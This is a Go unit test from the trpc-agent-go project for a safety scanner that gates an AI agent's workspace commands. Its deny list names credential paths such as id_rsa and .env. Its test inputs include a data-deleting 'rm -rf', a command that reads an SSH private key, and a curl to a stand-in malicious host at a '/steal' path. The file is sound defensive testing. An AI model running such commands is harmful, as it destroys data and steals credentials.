//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

package main

import (
	"testing"
)

func TestToolSafetyGuard(t *testing.T) {
	policy := &Policy{
		AllowedCommands:    []string{"go test ./..."},
		DeniedCommands:     []string{"rm -rf"},
		DeniedPaths:        []string{"/.ssh/", "/.env", "id_rsa"},
		AllowedDomains:     []string{"github.com"},
		MaxTimeoutSec:      30,
		MaxOutputSizeBytes: 1048576,
	}

	scanner := NewScanner(policy)

	t.Run("Safe_Command_Allowed", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "go test ./...", "workspaceexec")
		if res.Decision != "allow" {
			t.Errorf("Expected allow, got %s", res.Decision)
		}
	})

	t.Run("Dangerous_Deletion_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "rm -rf /tmp/data", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_DANGEROUS_DELETION" {
			t.Errorf("Expected deny RULE_DANGEROUS_DELETION, got %s (%s)", res.Decision, res.RuleID)
		}
	})

	t.Run("Credential_Read_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "cat ~/.ssh/id_rsa", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_DENIED_PATH_ACCESS" {
			t.Errorf("Expected deny RULE_DENIED_PATH_ACCESS, got %s (%s)", res.Decision, res.RuleID)
		}
	})

	t.Run("Unapproved_Egress_Denied", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "curl https://evil-malware.org/steal", "workspaceexec")
		if res.Decision != "deny" || res.RuleID != "RULE_UNAPPROVED_NETWORK_EGRESS" {
			t.Errorf("Expected deny RULE_UNAPPROVED_NETWORK_EGRESS, got %s (%s)", res.Decision, res.RuleID)
		}
	})

	t.Run("Approved_Egress_Allowed", func(t *testing.T) {
		res := scanner.ScanCommand("workspace_exec", "curl https://api.github.com/repos", "workspaceexec")
		if res.Decision != "allow" {
			t.Errorf("Expected allow, got %s", res.Decision)
		}
	})
}
